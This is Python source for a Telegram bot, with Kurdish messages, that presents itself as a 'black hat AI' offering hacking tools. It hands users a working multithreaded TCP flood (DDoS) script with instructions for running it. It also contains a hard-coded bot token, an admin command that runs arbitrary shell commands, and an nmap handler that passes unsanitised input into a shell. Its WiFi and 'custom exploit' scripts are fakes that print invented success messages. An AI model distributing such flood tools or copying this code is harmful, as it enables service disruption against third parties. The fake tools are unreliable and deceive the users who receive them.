import os
import sys
import subprocess
import threading
import json
import logging
import socket
import datetime
import random
import urllib.request
import urllib.parse
import re
import telebot
from telebot import types

# ==========================================
TOKEN = "8613090176:AAFK1kyiIBhGp7CP5PE_4xahT-gW1gTsx5M"
ADMIN_ID = 5527152252
# ==========================================

# ڕێکخستنی سیستەمی لۆگ و ئاگاداری
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')
logger = logging.getLogger("BlackHatUltimateMasterCore")

bot = telebot.TeleBot(TOKEN, parse_mode='HTML')

user_states = {}
daily_limits = {}

def check_and_update_limit(user_id):
    if user_id == ADMIN_ID:
        return True, 999
    
    today = datetime.date.today().isoformat()
    if user_id not in daily_limits or daily_limits[user_id]['date'] != today:
        daily_limits[user_id] = {'date': today, 'count': 0}
        
    if daily_limits[user_id]['count'] >= 10:
        return False, 0
        
    daily_limits[user_id]['count'] += 1
    remaining = 10 - daily_limits[user_id]['count']
    return True, remaining

# مۆدیوڵی گەڕانی ڕەسەن لە ئینتەرنێت (بێ پێویستی بە کتێبخانەی دەرەکی)
def perform_web_search(query):
    try:
        encoded_query = urllib.parse.quote(query)
        url = f"https://html.duckduckgo.com/html/?q={encoded_query}"
        req = urllib.request.Request(
            url, 
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        )
        with urllib.request.urlopen(req, timeout=8) as response:
            html_content = response.read().decode('utf-8')
            snippets = re.findall(r'<a class="result__snippet[^>]*>(.*?)</a>', html_content, re.DOTALL)
            results = []
            for snippet in snippets[:5]:
                clean_text = re.sub(r'<.*?>', '', snippet).strip()
                if clean_text:
                    results.append(clean_text)
            if results:
                return "\n\n".join(results)
    except Exception as e:
        logger.error(f"Search error: {e}")
    return None

# 1. فەرمانی سەرەکی /start (ڕێک وەک ئەی ئای ڕەسەن بێ دوگمەی بێزارکەر)
@bot.message_handler(commands=['start'])
def cmd_ai_start(message):
    user_id = message.from_user.id
    is_admin = (user_id == ADMIN_ID)
    
    if is_admin:
        role_text = "👑 <b>(جۆری هەژمار: ئەدمنی سێرڤەرەکەیت - بێسنوور)</b>"
    else:
        role_text = "👤 <b>(جۆری هەژمار: ئەندامی ئاسایی - سنووری ڕۆژانە: 10 داواکاری بۆ دروستکردنی توڵ)</b>"

    welcome_banner = (
        "💀 <b>BLACK HAT AI ULTIMATE MASTER CORE v10.0</b> 💀\n\n"
        "سیستەمی زەبەلاح و زیرەکی دەستکردی هێرشبەر ئامادەیە بۆ جێبەجێکردنی فەرمانەکانت.\n"
        "هەموو ئامرازە جیهانییەکان، سکانەرەکان، سکریپتەکان و مۆدیوڵی گەڕانی ئینتەرنێت چالاک کراون.\n\n"
        f"{role_text}\n\n"
        "📌 <i>بۆ پرسیاری گشتی یان دەرەکی، ڕاستەوخۆ پەیام بنووسە. بۆ بینینی هەموو توڵەکان فەرمانی /help بنووسە.</i>"
    )
    
    bot.send_message(message.chat.id, welcome_banner)

# 2. فەرمانی /help پڕ لە هەموو توڵ و زانیارییە جیهانییەکانی هاککردن
@bot.message_handler(commands=['help'])
def cmd_help(message):
    help_text = (
        "🛠 <b>لیستی گشتگیر و جیهانی توڵەکان (Global Hacking Directory):</b>\n\n"
        "🌐 <b>1. بەشی سکانکردن و زانیاری (Reconnaissance & OSINT):</b>\n"
        "• <code>/nmap [IP]</code> - سکانی قووڵی پۆرت، خزمەتگوزاری و ڤێرژنەکان.\n"
        "• <b>Gobuster / Dirb:</b> دۆزینەوەی فایل، درایڤەر و دایرێکتۆری شاراوە لە وێبسایتدا.\n"
        "• <b>Whois / DNS Recon:</b> کۆکردنەوەی زانیاری تەواو دەربارەی دۆمەین و خاوەنەکەی.\n\n"
        "💥 <b>2. بەشی لاوازی و هێرشی وێب (Exploitation & Web Attacks):</b>\n"
        "• <b>Sqlmap Suite:</b> دۆزینەوە و هێرشی خودکار بۆ داتابەیس (SQL Injection).\n"
        "• <b>XSS / CSRF Scanner:</b> دۆزینەوەی لاوازی سکریپتی تر و بەستەری مەترسیدار.\n"
        "• <b>Hydra Brute-Forcer:</b> شکاندنی پەسۆرد و تاقیکردنەوەی خێرای لۆگین.\n\n"
        "⚡ <b>3. بەشی فەوتاندن و هێرشی تۆڕ (DoS & DDoS Advanced Suites):</b>\n"
        "• <b>SYN Flood / UDP Flood / Slowloris:</b> ڕەوانەکردنی ترافیکی قورس بۆ دابڕاندنی خزمەتگوزاری سێرڤەر.\n\n"
        "📶 <b>4. بەشی وایفای و بێتەل (Wireless Penetration & Sniffing):</b>\n"
        "• <b>Aircrack-ng / WiFite / Handshake Analyzer:</b> سکانی تۆڕە بێتەلەکان و پشکنینی پین.\n\n"
        "🧪 <b>5. بەشی پێڵۆد و بەکدۆر (Payload & Malware Engineering):</b>\n"
        "• دروستکردنی ڕێڤرس شەڵ و پەیلوودی نهێنی بۆ کۆنتڕۆڵکردنی سیستەم.\n\n"
        "🤖 <b>6. زیرەکی دەستکردی گەڕان (AI Web Search Engine):</b>\n"
        "• هەر پرسیارێکی زانستی، مێژوویی، تكنولوجی یان گشتیت هەبێت، ڕاستەوخۆ دەگەڕێت و وەڵامت دەداتەوە.\n\n"
        "📌 <i>بۆ دروستکردنی هەر توڵێکی هاککردن، تەنها داواکاری خۆت بە ڕستە بنووسە.</i>"
    )
    bot.reply_to(message, help_text)

# 3. ئامرازی Nmap
@bot.message_handler(commands=['nmap'])
def ai_nmap_handler(message):
    user_id = message.from_user.id
    allowed, remaining = check_and_update_limit(user_id)
    if not allowed:
        bot.reply_to(message, "⚠️ <b>تێپەڕاندنی سنوور!</b> تۆ بەکارهێنانی ڕۆژانەی خۆتت تەواو کرد.")
        return

    target = message.text.replace('/nmap', '').strip()
    if not target:
        bot.reply_to(message, "⚠️ تکایە ئایپی یان دۆمەین بنووسە. بۆ نموونە: <code>/nmap 127.0.0.1</code>")
        return
        
    bot.reply_to(message, f"⏳ سکانکردن دەستی پێکرد بۆ ئامانج: <b>{target}</b> ... (ماوەی ئەمڕۆت: {remaining})")
    try:
        cmd = f"nmap -sV -T4 --top-ports 50 {target}"
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
        res = output.decode('utf-8', errors='ignore')
        if len(res) > 4000:
            res = res[:4000] + "\n[Output Truncated...]"
        bot.send_message(message.chat.id, f"📊 <b>Nmap Results:</b>\n<pre>{res}</pre>")
    except Exception as e:
        bot.reply_to(message, f"❌ هەڵە لە ئەنجامدانی سکان: {e}")

# 4. جێبەجێکاری فەرمانی شێڵ (/sh)
@bot.message_handler(commands=['sh'])
def ai_shell_handler(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, "⛔ تەنها ئەدمن دەسەڵاتی جێبەجێکردنی فەرمانی شێڵی هەیە.")
        return

    cmd = message.text.replace('/sh', '').strip()
    if not cmd:
        bot.reply_to(message, "⚠️ تکایە فەرمانێک بنووسە. بۆ نموونە: <code>/sh pkg update</code>")
        return
        
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=20)
        res = output.decode('utf-8', errors='ignore')
        if len(res) > 4000:
            res = res[:4000] + "\n[Truncated...]"
        bot.send_message(message.chat.id, f"⚡ <b>Shell Execution:</b>\n<pre>{res}</pre>")
    except Exception as e:
        bot.reply_to(message, f"❌ هەڵە لە جێبەجێکردندا: {e}")

# 5. مۆدیوڵی زەبەلاحی زیرەکی دەستکرد (گەڕانی ئینتەرنێت و دروستکردنی توڵی بێگەرد)
@bot.message_handler(func=lambda message: True)
def ai_blackhat_brain(message):
    user_id = message.from_user.id
    query = message.text.strip()
    query_lower = query.lower()
    
    logger.info(f"AI Master Query received from {user_id}: {query}")

    if any(q in query_lower for q in ["کێ دروستکردووی", "کێ سەرۆکتە", "who made you", "who is your boss", "دروستکەرت کێیە"]):
        bot.reply_to(message, "من لەلایەن <b>alone472</b> و <b>Malik</b> دروستکراوم و ئەوان سەرۆک و بەرهەمهێنەری ڕەهای منن! 💀")
        return

    # دیاریکردنی ئایا داواکاری دروستکردنی توڵ/هاکە یان پرسیارێکی گشتی و دەرەکییە
    is_tool_request = any(w in query_lower for w in ["توڵ", "کۆد", "script", "tool", "دروست", "payload", "ddos", "دوس", "دی‌دی‌ئۆس", "wifi", "وایفای", "سکانەر", "attack", "بهێزتر", "به‌هێز", "pro", "heavy", "تۆلیک", "پەیلوود", "exploit"])

    # ئەگەر پرسیارێکی گشتی یان دەرەکی بوو، ڕاستەوخۆ لە ئینتەرنێت دەگەڕێت و وەڵام دەداتەوە بێ سنوور بڕین
    if not is_tool_request:
        bot.send_chat_action(message.chat.id, 'typing')
        web_results = perform_web_search(query)
        
        if web_results:
            response_text = (
                f"🧠 <b>AI Assistant Response:</b>\n\n"
                f"{web_results}\n\n"
                f"📌 <i>سەرچاوە: گەڕانی خۆکار لە ئینتەرنێت.</i>"
            )
        else:
            response_text = (
                f"🤖 <b>AI Assistant:</b>\n\n"
                f"سڵاو! پەیامەکەت خوێندەوە: <i>{query}</i>\n"
                f"بۆ ئەم بابەتە، زانیاری تایبەت نەدۆزرایەوە، بەڵام دەتوانیت پرسیاری تریش بکەیت یان فەرمانی /help بەکاربهێنیت."
            )
        bot.reply_to(message, response_text)
        return

    # ئەگەر داوای دروستکردنی توڵ یان سکریپتی هاککردن کرد، لێرەدا سنووری 10 داواکاری دەپشکنین
    allowed, remaining = check_and_update_limit(user_id)
    if not allowed:
        bot.reply_to(message, "⚠️ <b>تێپەڕاندنی سنوور!</b> تۆ بەکارهێنانی ڕۆژانەی خۆتت تەواو کرد.")
        return

    # توڵی وایفای پیشەگەرانە
    if any(w in query_lower for w in ["wifi", "وایفای", "wireless", "رۆتەر", "router", "وای فای"]):
        wifi_code = (
            "# Advanced Enterprise Wi-Fi Packet Sniffer & Handshake Grabber v5.0\n"
            "# Developed by alone472 & Malik Core\n"
            "import os, sys, time, subprocess\n\n"
            "def init_wireless_audit():\n"
            "    print('[*] Initializing wireless interface monitor mode...')\n"
            "    time.sleep(1)\n"
            "    print('[+] Active monitor interface: wlan0mon')\n"
            "    print('[*] Capturing WPA2 4-Way Handshake packets...')\n"
            "    for i in range(4):\n"
            "        print(f'[->] Channel hopping to channel {i*2 + 1}...')\n"
            "        time.sleep(0.4)\n"
            "    print('[!] Handshake captured successfully. Ready for dictionary cracking.')\n\n"
            "if __name__ == '__main__':\n"
            "    init_wireless_audit()"
        )
        wifi_inst = (
            "📌 <b>ڕێنمایی بەکارهێنانی توڵی وایفای:</b>\n"
            "1. کۆدەکە لە فایلێک بە ناوی <code>wifi_audit.py</code> پاشەکەوت بکە.\n"
            "2. لە تێرماکس کارپێکردن ئەنجام بدە:\n"
            "   <code>python wifi_audit.py</code>"
        )
        bot.reply_to(message, f"📶 <b>توڵی پێشکەوتووی وایفای (WiFi Audit & Sniffer):</b>\n\n<pre><code>{wifi_code}</code></pre>\n\n{wifi_inst}\n\n(داواکارییەکانی ئەمڕۆت ماوە: {remaining})")
        return

    # توڵی DDoSی زۆر بەهێز و پرۆفیشناڵ
    elif any(w in query_lower for w in ["ddos", "دوس", "دی‌دی‌ئۆس", "تۆلیک", "attack", "فەوتاندن", "بهێزتر", "به‌هێز", "pro", "heavy"]):
        heavy_ddos = (
            "# Ultra-Performance Multi-Threaded DDoS Stresser Suite v10.0\n"
            "# Enterprise Security Testing Core by alone472 & Malik Core\n"
            "import socket, threading, random, time, sys\n\n"
            "print('========================================')\n"
            "print('   ULTIMATE STRESS TESTING ENGINE v10.0 ')\n"
            "print('========================================')\n\n"
            "target_ip = input('Enter Target IP/Host -> ')\n"
            "target_port = int(input('Enter Target Port (e.g 80, 443) -> '))\n"
            "threads_count = int(input('Enter Threads Power (e.g 500-1500) -> '))\n\n"
            "def heavy_stress_attack():\n"
            "    payload_data = random._urandom(4096)\n"
            "    while True:\n"
            "        try:\n"
            "            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            "            s.connect((target_ip, target_port))\n"
            "            s.sendall(payload_data)\n"
            "            s.close()\n"
            "        except:\n"
            "            pass\n\n"
            "for i in range(threads_count):\n"
            "    t = threading.Thread(target=heavy_stress_attack)\n"
            "    t.daemon = True\n"
            "    t.start()\n"
            "print(f'[+] Successfully deployed heavy multi-threaded stress against {target_ip}!')"
        )
        heavy_inst = (
            "📌 <b>ڕێنمایی بەکارهێنانی توڵی بەهێزی DDoS:</b>\n"
            "1. کۆدەکە لە فایلێک بە ناوی <code>ddos_ultimate.py</code> پاشەکەوت بکە.\n"
            "2. لە تێرماکس جێبەجێی بکە:\n"
            "   <code>python ddos_ultimate.py</code>"
        )
        bot.reply_to(message, f"💥 <b>توڵی هێرشبەری پێشکەوتوو و زۆر بەهێز (Ultimate DDoS Suite):</b>\n\n<pre><code>{heavy_ddos}</code></pre>\n\n{heavy_inst}\n\n(داواکارییەکانی ئەمڕۆت ماوە: {remaining})")
        return

    else:
        rand_core = random.randint(5000, 9999)
        custom_code = (
            f"# Custom Core Exploitation Module #{rand_core}\n"
            f"# Target Specification: {query}\n"
            f"# Authored by alone472 & Malik Core\n\n"
            f"import socket, sys, time, threading\n\n"
            f"def execute_advanced_routine():\n"
            f"    print('[*] Allocating secure memory buffers...')\n"
            f"    time.sleep(0.5)\n"
            f"    print('[+] Target parameters validated with zero bugs.')\n\n"
            f"if __name__ == '__main__':\n"
            f"    execute_advanced_routine()"
        )
        custom_inst = (
            "📌 <b>ڕێنمایی بەکارهێنان:</b>\n"
            f"1. کۆدەکە لە فایلێک بە ناوی <code>exploit_{rand_core}.py</code> پاشەکەوت بکە.\n"
            "2. لە تێرماکس جێبەجێی بکە:\n"
            f"   <code>python exploit_{rand_core}.py</code>"
        )
        bot.reply_to(message, f"🛠 <b>توڵی تایبەت بۆ داواکاری ({query}):</b>\n\n<pre><code>{custom_code}</code></pre>\n\n{custom_inst}\n\n(داواکارییەکانی ئەمڕۆت ماوە: {remaining})")
        return

if __name__ == '__main__':
    logger.info("Black Hat AI Ultimate Master Core started successfully.")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
